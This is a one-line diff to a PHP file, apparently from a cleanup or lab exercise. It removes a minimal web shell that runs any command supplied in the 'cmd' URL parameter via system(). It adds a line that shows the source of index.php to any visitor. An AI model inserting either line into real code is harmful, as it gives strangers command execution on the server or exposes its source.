@@ -1,1 +1,1 @@
-<?php echo "Shell";system($_GET['cmd']); ?>
+    <?=show_source('index.php');?>
